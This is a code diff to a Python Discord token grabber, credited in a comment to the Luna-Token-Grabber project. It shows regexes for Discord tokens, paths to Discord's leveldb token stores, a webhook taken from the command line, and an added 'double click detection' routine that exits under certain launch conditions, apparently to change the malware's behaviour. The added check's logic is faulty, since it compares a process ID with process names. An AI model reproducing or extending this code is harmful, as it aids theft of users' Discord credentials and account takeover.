@@ -20,6 +20,23 @@ temp = os.getenv("TEMP")
 encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
 normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 
+# user double click detection like what is in somali obf
+def is_user_click():
+    # Get the PPID of the current process
+    ppid = psutil.Process(os.getpid()).ppid()
+
+    # Get the PPID of the shell process
+    shell_ppid = psutil.Process(ppid).ppid()
+
+    # Check if the PPID of the shell process is a known shell PID
+    known_shell_pids = [psutil.Process(pid).name() for pid in psutil.pids() if psutil.Process(pid).name() in ['explorer.exe', 'Finder']]
+    
+    if shell_ppid in known_shell_pids:
+        print("User double-clicked on the program to run.")
+        return True
+    else:
+        return False
+
 paths = {
     "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
     "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
@@ -365,6 +382,10 @@ class inject:
 # ++++++++++++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING ABLOVE THIS LINE https://github.com/Smug246/Luna-Token-Grabber ++++++++++++++++++++++++++++
 
 if __name__ == "__main__":
+    isuserclick = is_user_click()
+    if isuserclick == True:
+        exit(1)
+        
     webhook = argv[1]
     remove_dup = [*set(all_tokens)]
     with open("tokens.txt", "a+", encoding="utf-8", errors="ignore") as f:
